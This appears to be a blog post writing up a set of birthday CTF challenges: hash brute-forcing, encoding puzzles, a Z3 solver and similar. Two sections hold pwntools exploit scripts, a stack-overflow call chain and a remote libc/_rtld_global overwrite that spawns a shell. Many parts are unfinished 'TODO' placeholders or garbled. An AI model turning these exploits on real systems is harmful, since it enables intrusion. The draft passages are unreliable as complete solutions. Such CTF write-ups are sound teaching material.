---
layout: post
title: "Birthday CTF 2020: Writeup"
date: 2020-07-09 15:00
type: post
published: true
comments: false
categories: ctf
---

Earlier this spring I celebrated my 29th birthday. I was sitting a my computer working from home when suddenly, at 15:00, my Twitter notifications exploded.
My teammates and a few of our CTF friends had prepared a CTF challenge each for me. It was one of best birthday presents I've ever received I think and I was basically sitting there laughing as I saw all the tweets rolling in.
It actually took me a week to solve the challenges. I blame work and other commitments but I did solve them in the end. Naturally I have to finish it with writing a write-up for the challenges.
Each challenge was provided as a Tweet directed at me with the [hashtag #ZetaTwoCTFVirtuoso](https://twitter.com/hashtag/ZetaTwoCTFVirtuoso) except two which were follow-ups to another challenge.

## [quend's Challenge](https://twitter.com/Calaquendi44/status/1250046149026873344)

The QR code decodes into a URL from which we can download a file which seems to be some kind of text file:

{% highlight bash %}
$ zbarimg challenge.jpeg
QR-Code:http://www.sophia.re/chal.ll
scanned 1 barcode symbols from 1 images in 0.28 seconds
$ curl -o cha.ll 'https://www.sophia.re/chal.ll'
$ file cha.ll 
cha.ll: ASCII text, with very long lines

{% endhighlight %}

Looking at the filename and the contents of the file we see that this is LLVM code which we can compile:

{% highlight bash %}
$ head cha.ll 
; ModuleID = 'x.cc'
source_filename = "x.cc"
target datalayout = "e-m:o-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-apple-macosx10.15.0"

%struct.flag_hash = type { [9 x i32] }
%struct.bday_hash = type <{ %"class.std::__1::basic_string", [9 x i32], [4 x i8] }>
%"class.std::__1::basic_string" = type { %"class.std::__1::__compressed_pair" }
%"class.std::__1::__compressed_pair" = type { %"struct.std::__1::__compressed_pair_elem" }
%"struct.std::__1::__compressed_pair_elem" = type { %"struct.std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::__rep" }

$ clang -o chall cha.ll -lstdc++
{% endhighlight %}

For some reason I couldn't compile this with clang on Linux so I did it on my Macbook instead.
I then analyzed the resulting binary in IDA and found the following relevant pieces of code.

{% highlight c++ %}
int main(int argc, const char **argv, const char **envp)
{
  ...
  std::operator<<<std::char_traits<char>>(std::cout, "Please, enter the key: ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, bday);
  std::string::c_str((QHashData::Node *)bday);
  if ( strlen(input) == 18 )
  {
    for ( i = 0; i < 9; ++i )
      bday[i + 6] = xml_strhash(&input[2 * i], 2);
    for ( j = 0; j < 9; ++j )
    {
      if ( bday[j + 6] != flag_hash[j] )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "Failure...\n");
        return -2;
      }
    }
    std::operator<<<std::char_traits<char>>(&std::cout, "You did it! Flag is BDayCTF{");
    v5 = std::operator<<<char>(v4, bday);
    std::operator<<<std::char_traits<char>>(v5, "}\n");
    result = 0;
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Nope!\n");
    result = -1;
  }
  return result;
}

__int64 xml_strhash(const unsigned __int8 *data, int len)
{
  ...
  cur_ptr = data;
  result = 0;
  ...
  while ( len-- )
  {
    cur_ptr2 = cur_ptr++;
    result = (*cur_ptr2 + 0x10 * result) ^
     ((((*cur_ptr2 + 0x10 * result) & 0xF0000000) >> 24) | 
     (*cur_ptr2 + 0x10 * result) & 0xF0000000);
  }
  return result;
}
{% endhighlight %}

The program takes a string, checks that the input is 18 chars long, hashes the chars in pairs and compares them against a target hash which is initialized with this data:

{% highlight c++ %}
__data:0000000100004110 flag_hash_const dd 1891, 1711, 1984, 1967, 870, 1727, 1841, 1956, 849
{% endhighlight %}

I put together this script to bruteforce the possible combinations of letters.

{% highlight python %}
#!/usr/bin/env python3

import itertools
import string

target = [1891, 1711, 1984, 1967, 870, 1727, 1841, 1956, 849]
assert len(target) == 9

def xml_strhash(data):
    result = 0
    for b in data:
        result = (b + result *16) ^ ((((b + result *16) & 0xF0000000) >> 24) | (b + result *16) & 0xF0000000)
        result &= 0xFFFFFFFF
    return result

pairs = [set() for _ in range(9)]

for pair in itertools.product(string.printable, repeat=2):
    pair_hash = xml_strhash(''.join(pair).encode('ascii'))
    try:
        pair_idx = target.index(pair_hash)
        pairs[pair_idx].add(pair)
        print('pairs[%d] = %s' % (pair_idx, pair))
    except ValueError:
        pass

for p in pairs:
    print(','.join(''.join(x) for x in p))
{% endhighlight %}

This gave me the following possible combinations for each pair.

{% highlight bash %}
$ python3 solve.py
rC,pc,qS,os,s3,t#
fO,e_,g?,h/,do
x@,y0,v`,up,wP,z
x/,u_,vO,w?,to
0f,/v,4&,2F,36,1V
f_,h?,i/,eo,gO
q!,oA,nQ,ma,lq,p1
vD,td,st,x$,w4,uT
21,1A,0Q,.q,/a,3!
{% endhighlight %}

Trying a few different variants to get something readable, we end up with this:

`s3`, `e_`, `y0`, `u_`, `0f`, `f_`, `p1`, `st`, `3!`

which results in the following flag:

Flag: BDayCTF{s3e_y0u_0ff_p1st3!}



## [b0bb's Challenge](https://twitter.com/0xb0bb/status/1250046144421474304)

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

ADDR_BOF_OFF = 0x0804861E
ADDR_INIT_MEM = 0x080485D0
ADDR_INIT_BANNER = 0x08048596
ADDR_PRINT_BANNER = 0x08048649
ADDR_EXIT = 0x08048613

FAKE_STACK = 0x804d000 - 0x100

r = process('./challenge')
r.recvuntil('bof: ')

pause()

payload1 = b''
#payload1 += cyclic(29)
payload1 += b'A'*cyclic_find(0x61616165)
payload1 += p32(FAKE_STACK) # Writable area
payload1 += p32(ADDR_BOF_OFF)
r.sendline(payload1)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 1*4)
payload2 += p32(ADDR_INIT_MEM)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 2*4)
payload2 += p32(ADDR_INIT_BANNER)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 3*4)
payload2 += p32(ADDR_PRINT_BANNER)
payload2 += p32(ADDR_BOF_OFF)
r.sendline(payload2)

payload2 = b''
#payload2 += cyclic(29)
payload2 += b'B'*cyclic_find(0x61616165)
payload2 += p32(FAKE_STACK + 4*4)
payload2 += p32(ADDR_EXIT)
payload2 += p32(0)
r.sendline(payload2)

banner = r.recvall()
sys.stdout.buffer.write(banner)

r.interactive()
{% endhighlight %}

TODO

![b0bb's challenge flag](/assets/images/ctf/bday-b0bb-flag.png)

TODO

Flag: BDayCTF{Many_Happy_Returns}

## [capsl's Challenge](https://twitter.com/capslcc/status/1250046148133277698)

This challenge was a simple data conversion challenge. First convert the decimal number into hex and then decode the hex as bytes and treat it as ASCII test.
The following Python snippet does this.

{% highlight python %}
print(bytes.fromhex('%x' % 668430635688626836307545807846250470926814185595574578375052469735293834318137052219361513769677150920763734277731983741).decode('ascii'))
{% endhighlight %}

Running it prints the flag.

Flag: BDayCTF{Happy~bday~Z!~let~2020~be~HAX~n~awesome!!}

## [Steven's Challenge](https://twitter.com/StevenVanAcker/status/1250046150347853824)

Steven's challenge consisted of the large system of emoji equations.

![Steven's challenge image](/assets/images/ctf/bday-steven-challenge.jpg)

Unfortunately, Python does not support emojis as variable names so I had to manually transcribe the whole image into the following Z3 script.
It first defines our emoji variables and restrict them to the range `[0, 127]`. Then it sets up the equations, solves them and uses the solution to print the flag.

{% highlight python %}
#!/usr/bin/env python3

from z3 import *

s = Solver()

e_waving = Int('e_waving')
e_kiss = Int('e_kiss')
e_dancer2 = Int('e_dancer2')
e_balloon = Int('e_balloon')
e_popper = Int('e_popper')
e_drink = Int('e_drink')
e_party = Int('e_party')
e_rose = Int('e_rose')
e_popperball = Int('e_popperball')
e_calendar = Int('e_calendar')
e_present = Int('e_present')
e_martini = Int('e_martini')
e_cake = Int('e_cake')
e_flowers = Int('e_flowers')
e_dancer = Int('e_dancer')

emojis = [e_waving,e_kiss,e_dancer2,e_balloon,e_popper,e_drink,e_party,e_rose,e_popperball,e_calendar,e_present,e_martini,e_cake,e_flowers,e_dancer]
for e in emojis:
    s.add(And(e >= 0, e < 127))
s.add(e_present == ord('y'))

s.add(e_waving == e_kiss + 2)
s.add(e_dancer2 + e_balloon + e_waving + e_popper == e_drink + e_party + e_drink + e_kiss + 44)
s.add(e_rose + e_popper + e_popperball + e_drink == e_party + e_drink + e_calendar + e_balloon + 125)
s.add(e_dancer + e_party + e_popperball + e_party == e_cake + e_present + e_balloon + e_martini + 35)
s.add(e_cake + e_party + e_popperball + e_present == e_kiss + e_flowers + e_balloon + e_flowers + 87)
s.add(e_party + e_popper + e_popperball + e_calendar == e_rose + e_balloon + e_popper + e_kiss + 5)
s.add(e_popper + e_balloon + e_present + e_party == e_balloon + e_balloon + e_popper + e_kiss + 20)
s.add(e_cake + e_present + e_drink + e_drink == e_rose + e_kiss + e_drink + e_martini + 2)
s.add(e_flowers + e_popper + e_rose + e_kiss == e_cake + e_dancer2 + e_party + e_balloon + 101)
s.add(e_popper + e_dancer2 + e_kiss + e_present == e_balloon + e_popper + e_flowers + e_martini + 183)
s.add(e_dancer + e_popper + e_popperball + e_party == e_kiss + e_flowers + e_drink + e_balloon + 84)
s.add(e_dancer + e_popper + e_rose + e_popper == e_drink + e_waving + e_popper + e_flowers + 85)
s.add(e_party + e_drink + e_waving + e_drink == e_martini + e_popperball + e_drink + e_party + 32)

if s.check() == sat:
    m = s.model()
    flag = list('BDa') + [e_present] + list('CTF{') + [
        e_popper, e_party, e_balloon, e_kiss, e_present, e_drink, e_waving, e_flowers, e_popper,
        e_drink, e_balloon, e_popperball, e_flowers, e_martini, e_dancer, e_party, e_popper, e_drink,
        e_calendar, e_balloon, e_rose, e_drink, e_balloon, e_popper, e_flowers, e_dancer2, e_popperball,
        e_kiss, e_drink, e_martini, e_dancer, e_party, e_drink, e_cake, e_dancer2, e_popperball
    ] + list('}')
    flag = ''.join(x if type(x) == str else chr(m[x].as_long()) for x in flag)
    print(flag)
else:
    print('unsat')
{% endhighlight %}

Running it produces the flag as output.

Flag: BDayCTF{r34dy_f0r_4n07h3r_l4p_4r0und_7h3_5un}

## [avlidienbrunn's Challenge](https://twitter.com/avlidienbrunn/status/1250046160603144193)

> congratulations for leveling up! You might be a stellar haxor but can you crack basing 64 encryption?? zeta.alieni.se

The website just contains this text:

> Securelly encrypted flag: 2405922380766088

Inspecting the page shows the following DOM:

> Securelly encrypted flag: <!-- boss said basing 64 but I could only find 36?? --> <span id="flag">2405922380766088</span>

Encoding the number to The number decodes 





Flag: BDayCTF{at least basing 64 has support for space}

## [likvidera's Challenge](https://twitter.com/likvidera/status/1250046386470555648)

Flag: BDayCTF{HaPPy_b1rthd4y!!}

## [Lars's Challenge](https://twitter.com/_LarsH/status/1250046396671184903)

Flag: BDayCTF{:eggplant:+:eggplant:+:eggplant:}

## [Bill's Challenge](https://twitter.com/noteyler/status/1250046144505212928)

TODO

{% highlight bash %}
$ zbarimg challenge.png
QR-Code:SUpLSE1aM1BNVkhVSVJTRkdCSEZJN0xCUE5QVEFaTEJINTRXUVlMRUw1S0Q2UTJCTDVQVlU1Wjc=
scanned 1 barcode symbols from 1 images in 0.03 seconds

$ base64 -D challenge.b64 > challenge.b32
$ base32 -d challenge.b32
BTvgoeODFE0NT}a{_0ea?yhad_T?CA__Zw?
{% endhighlight %}

TODO

```
BTvgoeO  
DFE0NT}  
a{_0ea?  
yhad_T?  
CA__Zw?  
```

TODO

```
BDayCTF{hAvE_a_g00d_oNe_ZeTaTwO}???
```

Flag: BDayCTF{hAvE_a_g00d_oNe_ZeTaTwO}

## [bootplug's Challenge](https://twitter.com/bootplug_ctf/status/1250046146262773768)

TODO

{% highlight python %}
#!/usr/bin/env python3

from pwn import *
import string

def attempt(flag):
    r = process(['/home/zetatwo/tools/pin/pin', '-t', '/home/zetatwo/tools/pin/source/tools/ManualExamples/obj-intel64/inscount0.so', '--', './main'], level='warn')
    r.sendline(flag)
    r.wait()
    r.close()
    with open('inscount.out', 'r') as fin:
        try:
            count_data = fin.read()
            return int(count_data.replace('Count ', '').strip())
        except ValueError as e:
            print(c, count_data)
            print(e)
            return 0


flag = ''
with log.progress('Finding flag') as p:
    while len(flag) == 0 or flag[-1] != '}':
        best_count = 0
        best_char = None
        for c in string.printable:
            cand_flag = flag + c
            cand_count = attempt(cand_flag)
            p.status(cand_flag + ' (%d/%d)' % (cand_count, best_count))
            if cand_count > best_count:
                best_count = cand_count
                best_char = c

        flag += best_char

    p.success(flag)
{% endhighlight %}

TODO

Flag: BDayCTF{keep_up_the_good_work!_love_from_bootplug<3}

## [OverTheWire's Challenge](https://twitter.com/OverTheWireCTF/status/1250046146996834304)

TODO

{% highlight bash %}
$ barimg challenge.png
QR-Code:https://0bin.net/paste/UcHkL9geQykAXG+K#qTRFMjBAO4hBzW5DAJfObnULhggtjNWrM9XEYf4dsO1
scanned 1 barcode symbols from 1 images in 0.13 seconds
{% endhighlight %}

TODO
DECODE, DECOMPRESS AND REVERSE ME:

{% highlight bash %}
$ file challenge.dat
challenge.dat: gzip compressed data, last modified: Tue Apr 14 02:24:30 2020, from Unix, original size 7240
$ mv challenge.dat challenge.gz
$ gunzip challenge.gz
gzip: challenge: Value too large for defined data type
$ file challenge
challenge: data
$ python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex(sys.stdin.buffer.read().hex()[::-1]))' < challenge > challenge.rev
$ file challenge.rev
challenge.rev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=2dfad91c5734e16faffb7034b09fb9ebdbdecee7, not stripped
{% endhighlight %}

TODO

{% highlight python %}
#!/usr/bin/env python3

with open('challenge.rev', 'rb') as fin:
    fin.seek(0x768)
    data = fin.read(38)

decrypted = bytes(x^y for x,y in zip(data,data[1:])).decode('ascii')
print(decrypted)
{% endhighlight %}

TODO


Flag: DayCTF{sTiLl_g0T_iT_1N_y0Ur_0Ld_4G3!}

## [watevr's Challenge](https://twitter.com/watevr_team/status/1250046548144205824)

> We hope that you have had a glorious birthday, we from watevr wanted to celebrate your birthday with a few challenges, good luck https://watevr.xyz/cake.txt

TODO

{% highlight javscript %}
m=[139,72,39,121,82,202,79,58,106,160,241,249,182,253,135,124,70,85,211,84,164,175,79,163,153,215,67,190,183,108,30,216,39,116,93,119,33,201,131,239,230,42,104,243,209,220,171,11,236,155,248,82,85,55,171,144,233,177,125,166,204,206,248,100,11,25,178,209,43,109,173,102,78,245,231,62,185,216,67,241,108,192,133,107,151,41,5,177,7,221,244,37,171,213,231,64,128,81,7,170,120,12,29,83,56,217,207,197,135,83,78,222,243,25,110,217,169,39,133,105,157,88,227,107,11,95,88,143,50,141,246,104,150,121,209,122,170,192,136,27,247,136,203,154,22,62,142,50,145,87,52,199,102,112,100,95,91,200,210,206,174,85,233,120,5,185,82,225,12,92,66,192,160,114,134,247,16,176,253,230,8,191,239,197,174,173,62,153,147,191,147,154,172,171,19,139,87,134,93,182,198,76,189,236,186,220,190,73,7,125,116,118,36,93,52,101,242,24,214,128,115,133,6,8,157,129,185,126,47,39,173,230,87,67,80,53,197,63,236,134,157,73,196,249,48,112,35,239,231,50,212,97,177,201,222,92,41,199,130,231,21,223,206,27,183,116,233,144,174,244,243,40,80,94,241,239,212,12,239,49,105,64,222,145,132,169,223,52,75,99,144]

     ! ! ! ! ! !
    ~-~-~-~-~-~-~
    "   Happy   ",
    " Birthday! ",
//==================\\
a=255,x=(k,d)=>(i=j=f=
0,s=[...Array(a).keys(
)],s.forEach((_,i)=>(f
=f+s[i]+k[i%k.length]&
a,[s[i],s[f]]=[s[f],s[
i]])),d.map(y=>(i=i+1&
a,j=j+s[i]&a,[s[i],s[j
]]=[s[j],s[i]],y^s[s[i
]+s[j]&a]))),l="Upvhi\
!mvdl-!usz!bhbjo!ofyu\
!zfbs",r=Math.random,c
=c=>c.charCodeAt(),k=[
r(),r(),r()].map(b=>b*
a|0),r=x(k,m),s=String
.fromCharCode,r=s(...r
),r.startsWith("ZETA")
?r.slice(4):s(...[...l
].map(a=>a.charCodeAt(
)-1))/////////////////
{% endhighlight %}

TODO

```
Grattis på 33 års dagen Calle, du verkar ha dina skills i behåll trots din ålder,
du har löst del 1 av våra challs,
här har du lokes chall: :?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o".p29qr(,stuvw=*x0y8z{<|#6'}@
och här är nnewrams chall: https://watevr.xyz/zeta.c
```

Flag: "Grattis på 33 års dagen Calle, du verkar ha dina skills i behåll trots din ålder"

## nnewram's Challenge

URL: https://watevr.xyz/zeta.c  

TODO

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

HOST = '83.209.18.82'
PORT = 1337

#HOST = 'localhost'
#PORT = 31337

r = remote(HOST, PORT)
libc = ELF('./libc.remote.so.6')

r.recvuntil('cka: ')
rtld_global_addr = int(r.recvline().strip().decode('ascii'))
log.info('Leak: %#014x', rtld_global_addr)

libc_addr_ptr = rtld_global_addr - 72
# $rip = *(_rtld_global + 3840)
# $rdi = _rtld_global+2312
rtld_offset = (3840 - 2312)//8

r.recvuntil('cka: ')
r.sendline(str(libc_addr_ptr))

r.recvuntil('fel address: ')

libc_ptr = int(r.recvline().decode('ascii').strip())
libc_base = libc_ptr - 1471088

log.info('Inside libc: %#016x', libc_ptr)
log.info('Libc base: %#016x', libc_base)

pause()

r.recvuntil('du vill skriva till: ')
r.sendline(str(rtld_global_addr + 3840))

r.recvuntil('rde: ')
r.sendline(str(libc_base + libc.symbols['system']))

r.recvuntil('r /bin/sh: ')
r.sendline(str(rtld_offset))

r.interactive()
{% endhighlight %}

TODO

{% highlight bash %}
$ python3 solve.py
[+] Opening connection to 83.209.18.82 on port 1337: Done
[*] '/mnt/hgfs/Dropbox/ITsec/ctf/bday2020/nnewram/libc.remote.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leak: 0x7fd08e4f4060
[*] Inside libc: 0x007fd08e042270
[*] Libc base: 0x007fd08dedb000
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ cat /home/ctf/flag.txt
BDayCTF{gr4771s_på_föd3ls3d4g3n_Z3t4_från_w4t3vr_@nnewram}
{% endhighlight %}

TODO

Flag: BDayCTF{gr4771s_på_föd3ls3d4g3n_Z3t4_från_w4t3vr_@nnewram}

## Loke's Challenge

Data: 

TODO

```:?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o".p29qr(,stuvw=*x0y8z{<|#6'}@```  

{% highlight python %}
#!/usr/bin/env python3

from permutation import Permutation

text = ":?ABCDEFGHI;J5KLMNOPQRSTUVWXYZ[\\3) $!7&]1/^_`ab>+cde%fghi4jklmn-o\".p29qr(,stuvw=*x0y8z{<|#6'}@"
print(text)
assert len(text) == len(set(text))
numbers = [ord(x)-ord(' ')+1 for x in text]
assert set(numbers) == set(range(1,94+1))

p = Permutation(*numbers)
print(''.join([chr(ord(' ')+x-1) for x in p.inverse().to_image()]))
{% endhighlight %}

TODO

```
BDayCTF{hApPi_bIrHd@Y-zEte +woO!} "#$%&'()*,./0123456789:;<=>?GJKLMNQRSUVWXZ[\]^`cfgjklmnqsuvx|
```

TODO

Flag: BDayCTF{hApPi_bIrHd@Y-zEte +woO!}

